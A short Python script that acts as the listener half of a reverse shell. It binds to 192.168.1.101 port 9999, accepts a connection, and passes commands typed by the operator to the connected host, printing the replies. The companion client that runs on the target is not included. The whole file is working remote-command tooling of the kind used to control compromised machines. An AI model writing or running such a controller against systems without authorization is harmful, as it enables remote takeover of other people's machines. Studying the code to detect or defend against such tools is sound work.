import socket
import sys

# Creating a Socket:
def create_socket():
    try:
        global host
        global port
        global s
        host = "192.168.1.101"
        port = 9999
        s    = socket.socket()
    except socket.error as msg:
        print("[-] Socket error : " + msg)

 #Binding the Socket and Listening for Connections:
def bind_socket():
     try:
         print(f"[+] Binding the Socket @{host}:{port}")
         s.bind((host,port)) # Bind accepts host,port as tuple
         s.listen()

     except socket.error as msg:
        print("[-] Binding Error : " + msg)

#Accepting the Connection: (Socket must be Listening)
def accept_socket():
    conn,addr = s.accept()
    print("[+] Connection  has been Established from : " + addr[0] + str(addr[1]))
    send_command(conn)
    conn.close()

#Sending Shell Commands
def send_command(conn):
    while True:
        cmd = input("> ")
        if cmd == 'quit':
            conn.close()
            s.close()
            sys.exit()
        elif len(str.encode(cmd)) > 0 :
            conn.send(str.encode(cmd))
            response = conn.recv(5000)
            res = response.decode()
            print(res, end = "")

#Calling all Previous Functions
def main():
    create_socket()
    bind_socket()
    accept_socket()

main()
